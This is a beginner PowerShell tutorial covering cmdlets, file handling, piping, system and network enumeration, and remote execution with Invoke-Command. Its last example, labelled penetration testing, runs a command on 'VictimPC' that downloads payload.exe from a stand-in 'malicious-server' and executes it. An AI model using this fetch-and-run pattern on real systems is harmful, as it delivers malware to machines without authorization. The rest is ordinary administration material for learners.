### **Introduction to PowerShell**

PowerShell is a **cross-platform task automation solution** created by Microsoft. It integrates a **command-line shell**, **scripting language**, and **configuration management framework** built on the **.NET framework**. Unlike traditional command-line interfaces like `cmd.exe`, PowerShell is **object-oriented**, enabling more sophisticated automation and management capabilities.

### **Key Features**
1. **Object-Oriented Approach:**
   - Outputs and manipulates objects rather than plain text, making it more robust for complex operations.
   - Example: A file object can have properties (e.g., `Name`, `Size`) and methods (e.g., `Copy()`, `Delete()`).

2. **Cross-Platform Support:**
   - Originally Windows-exclusive, now supports macOS and Linux via PowerShell Core.

3. **Integration with .NET:**
   - Utilizes the powerful .NET framework, enabling access to APIs and system components.

### **A Brief History of PowerShell**
1. **Origins:**
   - Developed in the early 2000s by **Jeffrey Snover** to address the limitations of `cmd.exe` and batch files in automating and managing Windows systems.
   - Released in **2006**, it introduced an **object-oriented approach**, bridging the gap between Unix-style simplicity and Windows’ structured data handling.

2. **Evolution:**
   - **2016:** Microsoft introduced **PowerShell Core**, an **open-source, cross-platform version** for Windows, macOS, and Linux.
   - This made PowerShell a universal tool for IT professionals in heterogeneous environments.

### **What Makes PowerShell Powerful?**
1. **Objects:**
   - Objects represent entities with **properties** (data) and **methods** (actions).
   - Example:
     - A "Car" object might have:
       - **Properties:** `Color`, `Model`, `FuelLevel`
       - **Methods:** `Drive()`, `HonkHorn()`, `Refuel()`
     - Similarly, a PowerShell file object might include:
       - **Properties:** `Name`, `Size`, `CreationDate`
       - **Methods:** `Move()`, `Copy()`, `Delete()`

2. **Cmdlets:**
   - Pronounced "command-lets," these are lightweight commands built into PowerShell.
   - Cmdlets return **objects** instead of plain text, enabling direct data manipulation without additional parsing.

### **Why Use PowerShell?**
- **Automation:** Simplifies repetitive tasks and complex workflows.
- **Integration:** Seamless interaction with Windows systems and APIs.
- **Cross-Platform Flexibility:** Useful in diverse IT environments with multiple operating systems.

---
---

### **PowerShell basics**

#### **Launching PowerShell**
1. **On Windows**:
   - **Start Menu**: Search "powershell".
   - **Run Dialog**: `Win + R`, then type `powershell`.
   - **File Explorer**: Type `powershell` in the address bar.
   - **Task Manager**: File → Run new task → Type `powershell`.
2. **From cmd.exe**: Simply type `powershell` and press Enter.

#### **Understanding Cmdlets**
- **Definition**: Cmdlets are the building blocks of PowerShell, following a `Verb-Noun` convention (e.g., `Get-Content`, `Set-Location`).
- **Listing Cmdlets**:
  - `Get-Command`: Lists all available cmdlets, functions, and aliases.
  - Filters: Use parameters like `-CommandType` to refine results (e.g., functions only).
- **Getting Help**:
  - `Get-Help`: Provides details about cmdlets, including syntax and examples.
  - Example: `Get-Help Get-Date`.

#### **Aliases in PowerShell**
- **Purpose**: Shortcuts for cmdlets to ease the transition for users of other CLI tools.
- **Examples**:
  - `dir` → `Get-ChildItem`
  - `cd` → `Set-Location`
  - `cat` → `Get-Content`

#### **Extending PowerShell**
- **Modules**:
  - Collections of cmdlets that extend functionality.
  - Search for modules: `Find-Module -Name "Pattern*"`.
  - Install modules: `Install-Module -Name "ModuleName"`.

---
---



### **Navigating Directories**
- **List contents of a directory:**  
  `Get-ChildItem`  
  Similar to `dir` (Windows) or `ls` (Unix). Defaults to the current working directory if no path is specified.

- **Change the current directory:**  
  `Set-Location -Path "path_to_directory"`  
  Equivalent to `cd` in Command Prompt.

### **Creating Items**
- **Create a directory or file:**  
  `New-Item -Path "path" -ItemType "Directory/File"`  
  Combines functionality of `mkdir` and file creation commands:
  ```powershell
  # Create a directory:
  New-Item -Path ".\captain-cabin" -ItemType "Directory"

  # Create a file:
  New-Item -Path ".\captain-cabin\captain-log.txt" -ItemType "File"
  ```

### **Deleting Items**
- **Remove directories or files:**  
  `Remove-Item -Path "path"`  
  Replaces `rmdir` and `del`. Example:
  ```powershell
  Remove-Item -Path ".\captain-cabin\captain-log.txt"
  ```
  
### **Copying and Moving Items**
- **Copy files or directories:**  
  `Copy-Item -Path "source" -Destination "destination"`
  ```powershell
  Copy-Item -Path ".\captain-hat.txt" -Destination ".\captain-hat-backup.txt"
  ```

- **Move files or directories:**  
  `Move-Item -Path "source" -Destination "destination"`  
  Equivalent to `move` in Command Prompt:
  ```powershell
  Move-Item -Path ".\captain-log.txt" -Destination ".\captain-archives\"
  ```

### **Reading File Contents**
- **Display file contents:**  
  `Get-Content -Path "file_path"`  
  Similar to `type` (Windows) or `cat` (Unix):
  ```powershell
  Get-Content -Path ".\captain-cabin\captain-hat.txt"
  ```

### **Example Workflow**
```powershell
# Navigate to Documents folder:
Set-Location -Path ".\Documents"

# Create a new directory and a file inside it:
New-Item -Path ".\captain-cabin" -ItemType "Directory"
New-Item -Path ".\captain-cabin\captain-wardrobe.txt" -ItemType "File"

# List the contents of captain-cabin:
Get-ChildItem -Path ".\captain-cabin"

# Copy the file:
Copy-Item -Path ".\captain-cabin\captain-wardrobe.txt" -Destination ".\captain-cabin\backup.txt"

# Remove the original file:
Remove-Item -Path ".\captain-cabin\captain-wardrobe.txt"

# View the contents of the backup file:
Get-Content -Path ".\captain-cabin\backup.txt"
```

---
---


### **Piping Basics**
Piping (`|`) in PowerShell passes objects (with properties and methods) between commands, enabling powerful workflows.

Example:
```powershell
Get-ChildItem | Sort-Object Length
```
- `Get-ChildItem`: Retrieves directory contents as objects.
- `Sort-Object Length`: Sorts the objects by their `Length` property.

### **Filtering Cmdlets**

#### **1. `Where-Object`**
Filters objects based on conditions.
```powershell
# List only .txt files:
Get-ChildItem | Where-Object -Property "Extension" -eq ".txt"

# Files with size greater than 100 bytes:
Get-ChildItem | Where-Object -Property "Length" -gt 100
```

**Comparison Operators**:
- `-eq`: Equal to
- `-ne`: Not equal to
- `-gt`: Greater than
- `-ge`: Greater than or equal to
- `-lt`: Less than
- `-le`: Less than or equal to
- `-like`: Matches a pattern (wildcards allowed, e.g., `"*.txt"`)
- `-notlike`: Does not match a pattern

#### **2. `Select-Object`**
Selects specific properties or limits the output.
```powershell
# Show only file names and sizes:
Get-ChildItem | Select-Object Name, Length

# Retrieve the top 2 largest files:
Get-ChildItem | Sort-Object Length -Descending | Select-Object -First 2
```

#### **3. `Select-String`**
Searches for text patterns in files (like `grep` or `findstr`).
```powershell
# Find occurrences of "hat" in a file:
Select-String -Path ".\captain-hat.txt" -Pattern "hat"

# Search with regex:
Select-String -Path ".\log.txt" -Pattern "error\d+"
```

### **Building Pipelines**
PowerShell supports complex pipelines by chaining cmdlets. Example:
```powershell
# Display the largest .txt file:
Get-ChildItem | Where-Object -Property "Extension" -eq ".txt" | Sort-Object Length -Descending | Select-Object -First 1
```

### **Practical Examples**
1. **List all files starting with "ship":**
   ```powershell
   Get-ChildItem | Where-Object -Property "Name" -like "ship*"
   ```

2. **Sort and filter by file size:**
   ```powershell
   Get-ChildItem | Where-Object -Property "Length" -ge 1000 | Sort-Object Length
   ```

3. **Extract lines with a specific keyword from all `.log` files:**
   ```powershell
   Get-ChildItem -Filter "*.log" | Select-String -Pattern "critical"
   ```

### **Key Takeaways**
- Piping allows seamless chaining of cmdlets.
- Object-based filtering provides flexibility beyond simple text processing.
- Cmdlets like `Where-Object`, `Select-Object`, and `Select-String` enable advanced data analysis and file system management.
- Regular expressions enhance text search capabilities in `Select-String`.

---
---


### **1. System Information**

#### **`Get-ComputerInfo`**
- Provides a **comprehensive snapshot** of the system configuration.
- Includes details like:
  - Operating system version
  - Hardware specifications
  - BIOS information
  - Installation date
- **Usage:**
  ```powershell
  Get-ComputerInfo
  ```
  **Example Output:**
  ```
  WindowsProductName   : Windows Server 2022 Datacenter
  WindowsEditionId     : ServerDatacenter
  WindowsInstallDate   : 4/23/2024 6:36:29 PM
  ```

### **2. Local User Accounts**

#### **`Get-LocalUser`**
- Lists all local user accounts, showing:
  - Usernames
  - Account status (enabled/disabled)
  - Descriptions
- Useful for **managing user accounts** and **security configurations**.
- **Usage:**
  ```powershell
  Get-LocalUser
  ```
  **Example Output:**
  ```
  Name               Enabled Description
  ----               ------- -----------
  Administrator      True    Built-in account for administering the computer/domain
  captain            True    The beloved captain of this pirate ship.
  Guest              False   Built-in account for guest access
  ```

### **3. Network Configuration**

#### **`Get-NetIPConfiguration`**
- Provides **detailed network interface information**, including:
  - IP addresses
  - DNS servers
  - Gateway configurations
- Similar to `ipconfig` but object-oriented.
- **Usage:**
  ```powershell
  Get-NetIPConfiguration
  ```
  **Example Output:**
  ```
  InterfaceAlias       : Ethernet
  IPv4Address          : 10.10.178.209
  IPv4DefaultGateway   : 10.10.0.1
  DNSServer            : 10.0.0.2
  ```

#### **`Get-NetIPAddress`**
- Retrieves details for all **IP addresses** configured on the system, active or not.
- Displays information such as:
  - Address family (IPv4/IPv6)
  - Type (Unicast/Multicast)
  - Validity and preferred lifetimes
- **Usage:**
  ```powershell
  Get-NetIPAddress
  ```
  **Example Output:**
  ```
  IPAddress         : 10.10.178.209
  InterfaceAlias    : Ethernet
  AddressFamily     : IPv4
  AddressState      : Preferred
  ```

### **Practical Applications**
1. **Monitor system health:**
   - Use `Get-ComputerInfo` for a quick system summary.
2. **Manage user accounts:**
   - Check and enable/disable accounts with `Get-LocalUser`.
3. **Diagnose network issues:**
   - Use `Get-NetIPConfiguration` to confirm DNS and gateway settings.
   - Leverage `Get-NetIPAddress` for detailed IP address analysis.

---
---


### **1. Running Processes**

#### **`Get-Process`**
- Displays details of all currently running processes, including:
  - **Handles:** Resources used by the process.
  - **Memory Usage:** Non-paged memory (`NPM(K)`), paged memory (`PM(K)`), and working set (`WS(K)`).
  - **CPU Time:** Total processor time (`CPU(s)`).
  - **Process ID (PID):** Unique identifier for the process.
- **Use Cases:**
  - Monitor resource consumption.
  - Identify unusual or rogue processes.
- **Usage:**
  ```powershell
  Get-Process
  ```
  **Example Output:**
  ```
  Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
  -------  ------    -----      -----     ------     --  -- -----------
      309      13    18312       1256       0.52   1524   0 amazon-ssm-agent
       78       6     4440        944       0.02    516   0 cmd
  ```

### **2. Services Management**

#### **`Get-Service`**
- Lists the status of all services on the system.
- Key Fields:
  - **Status:** Running, Stopped, or Paused.
  - **Name:** Service name used in commands.
  - **DisplayName:** Friendly name for the service.
- **Use Cases:**
  - Ensure critical services are running.
  - Identify anomalous or unauthorized services.
- **Usage:**
  ```powershell
  Get-Service
  ```
  **Example Output:**
  ```
  Status   Name               DisplayName
  ------   ----               -----------
  Running  AmazonSSMAgent     Amazon SSM Agent
  Stopped  AppIDSvc           Application Identity
  Running  BFE                Base Filtering Engine
  ```

### **3. Active Network Connections**

#### **`Get-NetTCPConnection`**
- Displays information about current TCP connections:
  - **Local/Remote Addresses:** Source and destination.
  - **Ports:** Local and remote ports.
  - **State:** Connection state (e.g., `Listen`, `Established`, `TimeWait`).
  - **Owning Process:** Process associated with the connection.
- **Use Cases:**
  - Detect suspicious connections or backdoors.
  - Monitor server activity.
- **Usage:**
  ```powershell
  Get-NetTCPConnection
  ```
  **Example Output:**
  ```
  LocalAddress        LocalPort RemoteAddress       RemotePort State       OwningProcess
  ------------        --------- -------------       ---------- -----       -------------
  10.10.178.209       22        10.14.87.60         53523      Established 1444
  0.0.0.0             135       0.0.0.0             0          Listen      908
  ```

### **4. File Integrity Verification**

#### **`Get-FileHash`**
- Computes the hash of a file using algorithms like **SHA256**, **MD5**, etc.
- **Use Cases:**
  - Verify file integrity.
  - Detect tampering during malware analysis.
- **Usage:**
  ```powershell
  Get-FileHash -Path .\ship-flag.txt
  ```
  **Example Output:**
  ```
  Algorithm       Hash                      Path
  ---------       ----                      ----
  SHA256          54D2EC3C12BF3D[...]       C:\Users\captain\Documents\captain-cabin\ship-flag.txt
  ```

### **Practical Applications**
1. **Resource Monitoring:**
   - Use `Get-Process` to identify memory or CPU hogs.
2. **Service Troubleshooting:**
   - Check if essential services are stopped using `Get-Service`.
3. **Incident Response:**
   - Uncover unauthorized network activity with `Get-NetTCPConnection`.
   - Validate critical files using `Get-FileHash`.

---
---


### **Understanding Scripting**

**Definition:**
Scripting is creating a sequence of commands in a text file (script) that automates repetitive or complex tasks. Instead of manually executing commands, a script can handle these tasks efficiently, saving time and reducing errors.

**Benefits:**
1. **Automation:** Perform tedious or intricate tasks automatically.
2. **Error Reduction:** Scripts execute consistently, minimizing human errors.
3. **Scalability:** Manage multiple systems or large datasets effortlessly.

### **PowerShell Scripting in Cybersecurity**

**1. Blue Team Applications:**
- Automate **log analysis** to identify anomalies.
- Extract **indicators of compromise (IOCs)** from malware samples.
- Reverse-engineer scripts for understanding **malicious behaviors**.
- Perform regular **system integrity checks**.

**2. Red Team Applications:**
- Automate **system enumeration** for reconnaissance.
- Execute **remote commands** during penetration testing.
- Craft **obfuscated scripts** to bypass defenses.
- Simulate **real-world attacks** to test security measures.

**3. System Administration:**
- Automate **configuration management** across large networks.
- Enforce **security policies** (e.g., password complexity, firewall rules).
- Monitor **system health** and respond to incidents automatically.

### **Invoke-Command Cmdlet**

**Overview:**
`Invoke-Command` allows users to run commands or scripts on **remote systems**, a critical capability for both administrators and penetration testers. It supports task automation and multi-machine management.

**Syntax Highlights:**
1. **Run a Script on a Remote Computer:**
   ```powershell
   Invoke-Command -FilePath C:\scripts\test.ps1 -ComputerName Server01
   ```
   - Runs a local script (`test.ps1`) on a remote computer (`Server01`).

2. **Execute Commands on a Remote Computer:**
   ```powershell
   Invoke-Command -ComputerName Server01 -Credential Domain01\User01 -ScriptBlock { Get-Culture }
   ```
   - Executes the `Get-Culture` command on the remote computer as the specified user.

**Key Features:**
- **Remote Management:** Enables executing tasks on remote systems without direct access.
- **Credential Support:** Allows using specific user accounts for secure execution.
- **Scalability:** Targets multiple systems simultaneously using arrays of computer names.

### **Practical Applications of Invoke-Command**

1. **Automation Across Systems:**
   - Deploy updates or patches on multiple machines:
     ```powershell
     Invoke-Command -ComputerName @('Server01', 'Server02') -FilePath C:\scripts\update.ps1
     ```

2. **Incident Response:**
   - Extract logs or system information:
     ```powershell
     Invoke-Command -ComputerName Server01 -ScriptBlock { Get-EventLog -LogName Security }
     ```

3. **Penetration Testing:**
   - Execute payloads on a compromised machine:
     ```powershell
     Invoke-Command -ComputerName VictimPC -ScriptBlock { Invoke-WebRequest -Uri "http://malicious-server/payload.exe" -OutFile "payload.exe"; Start-Process "payload.exe" }
     ```
